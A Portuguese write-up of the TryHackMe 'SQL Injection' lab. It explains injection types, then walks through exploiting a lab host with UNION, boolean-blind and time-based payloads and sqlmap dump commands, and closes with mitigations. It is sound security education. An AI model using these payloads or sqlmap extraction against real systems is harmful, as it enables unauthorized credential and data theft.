# Write-up: TryHackMe — SQL Injection

**Plataforma:** TryHackMe  
**Sala:** SQL Injection (parte da trilha Web Fundamentals / Introduction to Web Hacking)  

---

## 1. Introdução e objetivos da sala

A sala **SQL Injection** introduz uma das vulnerabilidades mais antigas e críticas em aplicações web: a injeção de código SQL. O objetivo é entender como dados controlados pelo usuário podem ser interpretados como parte de queries SQL, permitindo desde leitura de informações sensíveis até execução de comandos administrativos no banco.

Objetivos específicos:
- Compreender por que a injeção SQL ocorre (concatenação insegura de input em queries).
- Identificar diferentes tipos de SQLi (error-based, boolean-based blind, time-based blind, UNION-based).
- Explorar técnicas práticas para extrair dados (colunas, tabelas, registros).
- Aprender contramedidas eficazes (queries parametrizadas, ORM, least privilege).

---

## 2. Ferramentas utilizadas

* Navegador (DevTools / Network) — observar requests e parâmetros.  
* Burp Suite / proxy HTTP — interceptar, testar e automatizar payloads.  
* `sqlmap` (opcional) — automação de detecção e exploração.  
* `sqlite3`, `mysql` cli — interagir com bancos locais quando aplicável.  
* `curl` — enviar requisições rápidas.  
* AttackBox / VM do TryHackMe — ambiente do laboratório.

---

## 3. Conceitos chave

### Por que ocorre
Injeção SQL ocorre quando a aplicação monta uma query SQL concatenando diretamente dados do usuário sem validação nem parametrização. Exemplo perigoso (em pseudocódigo):

```sql
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

Se `username` for `admin' -- ` a query muda de significado e pode ignorar a autenticação.

### Tipos comuns de SQLi
- **Error-based SQLi:** força o banco a retornar um erro que revela informações (colunas, conteúdo).  
- **Union-based SQLi:** usa `UNION SELECT` para anexar resultados arbitrários à resposta da aplicação.  
- **Boolean-based (blind) SQLi:** derivar informação interrogando o banco com condições verdadeiras/falsas e observando diferenças no comportamento/resposta.  
- **Time-based (blind) SQLi:** usa comandos que fazem a query demorar (ex: `SLEEP(5)`) para inferir verdade/falsidade.  
- **Inline/Stacked queries:** quando o banco permite múltiplas queries numa única entrada (menos comum em APIs modernas).

### Principais vetores
- Parâmetros em URL: `?id=1`  
- Campos de formulário: login, pesquisa, comentários  
- Headers ou cookies (quando o servidor os incorpora em queries)

### Sinais que indicam vulnerabilidade
- Respostas diferentes (conteúdo, códigos) após injetar `'` ou `"` no parâmetro.  
- Mensagens de erro do banco (ex: syntax error, unknown column).  
- Comportamento lento ou travado após payloads com `SLEEP()`.

---

## 4. Metodologia e resolução (walkthrough)

> Abaixo descrevo um fluxo típico de exploração em um lab tipo TryHackMe, com exemplos de payloads e raciocínio.

### Passo 1 — Reconhecimento
1. Acesse a aplicação vulnerável (`http://MACHINE_IP` / rota indicada).  
2. Identifique parâmetros que aceitam input do usuário: URLs com `?id=`, formulários de busca, campos de login etc.  
3. Teste rapidamente com um apóstrofo (`'`) no parâmetro para ver se a aplicação produz erro ou comportamento estranho:
```
http://MACHINE_IP/product?id=1'
```
Se a página retornar erro de SQL, é um bom sinal.

### Passo 2 — Determinar tipo básico (error-based / union-based)
- Teste básico para UNION:
```
?id=1 UNION SELECT NULL--
```
- Se a aplicação exibir resultados adicionais (ou se error-based), podemos extrair colunas:
```
?id=1 UNION SELECT username, password FROM users--
```
(se a página é compatível, ajustar número de colunas com `ORDER BY` ou usar `NULL` placeholders)

**Técnica para descobrir número de colunas (UNION fingerprint):**
```
?id=1 ORDER BY 1--
?id=1 ORDER BY 2--
...
```
quando `ORDER BY N` causar erro, você encontrou o limite de colunas.

### Passo 3 — Extração via boolean-based (blind SQLi)
Quando a aplicação não mostra erros nem resultados adicionais, usar boolean logic:

- Teste condicional:
```
?id=1 AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a')=1
```
Observe se a resposta muda (conteúdo ou código). Repetir para descobrir caracteres do password via brute force por posição (lentamente).

### Passo 4 — Time-based blind (quando não há diferença no conteúdo)
Use payloads que atrasem a resposta quando a condição for verdadeira:

MySQL example:
```
?id=1 AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(3), 0)--
```
Se a resposta demorar ~3s, então a primeira letra é `a`. Repetir por posição/char set.

### Passo 5 — Uso de `sqlmap` para automatizar (quando permitido)
```bash
sqlmap -u "http://MACHINE_IP/product?id=1" --dbs
sqlmap -u "http://MACHINE_IP/product?id=1" -D testdb --tables
sqlmap -u "http://MACHINE_IP/product?id=1" -D testdb -T users --dump
```
`sqlmap` detecta payloads apropriados, prova tipos de injeção e extrai dados automaticamente.

### Exemplo prático do lab (fluxo resumido)
- Identifiquei `?id=` como vulnerável com `'` causando erro.  
- Descobri via `UNION SELECT` que a página espera 2 colunas, então usei:
```
?id=1 UNION SELECT username, password FROM users--
```
- Extraí credenciais e descobri a flag/registro sensível.  
- Em casos guiados pela sala (SQLite flat-file hint), baixei `webapp.db` e usei `sqlite3` para abrir:
```bash
sqlite3 webapp.db
sqlite> .tables
sqlite> SELECT * FROM users;
```
- Com hashes descobertos (MD5 fracos), usei CrackStation/wordlists para crackear senhas (ex.: `5f4dcc3b...` -> `password`).

---

## 5. Payloads úteis (exemplos)

> Ajuste os payloads conforme o banco (MySQL, PostgreSQL, SQLite) e a sintaxe.

**Testes simples**
- `' OR '1'='1`  (usuários/params simples)
- `1' OR '1'='1' -- -`

**Union-based (exemplo com 2 colunas)**
- `?id=1 UNION SELECT NULL,NULL--`
- `?id=1 UNION SELECT username, password FROM users--`

**Boolean-based**
- `?id=1 AND (SELECT LENGTH(password) FROM users WHERE username='admin')>0`

**Time-based (MySQL)**
- `?id=1 AND IF(SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(3), 0)--`

**SQLite specific**
- `'; SELECT sqlite_version(); --`
- Extract table names:
  ```
  SELECT name FROM sqlite_master WHERE type='table';
  ```

---

## 6. Mitigações e recomendações

1. **Parameterized queries / Prepared Statements:** use placeholders em vez de concatenar strings (ex: `?` ou `$1` em drivers).  
2. **ORM / Query builders:** ajudam a evitar concatenação insegura (mas atenção: pode ser bypassado se usado incorretamente).  
3. **Whitelist de entradas:** quando aplicável, validar e restringir formatos (IDs numéricos).  
4. **Least privilege no DB:** contas de aplicação com permissões mínimas (evitar `DROP`/`SELECT *` quando não necessário).  
5. **Escapar corretamente:** se precisar, use escaping adequado ao dialeto do DB.  
6. **WAF e deteção:** regras para bloquear patterns conhecidos e detectar anomalias.  
7. **Logging e alertas:** registrar queries suspeitas e falhas repetidas.  
8. **Hashing de senhas e salting:** nunca armazenar senhas em texto, usar bcrypt/PBKDF2/argon2.

---

## 7. Lições aprendidas e conclusão

SQL Injection continua sendo crítico porque falhas de validação simples levam a exposição completa de dados e potencial comprometimento do servidor. A sala reforça o fluxo de descoberta: identificar pontos de entrada, testar com payloads leves, determinar o tipo de injeção e então extrair dados com técnicas adequadas (ou automatizar com ferramentas como `sqlmap`).  

Para desenvolvedores: priorizar parametrização e least privilege. Para profissionais de segurança: entender os diversos tipos de SQLi e praticar a extração e mitigação segura.

---
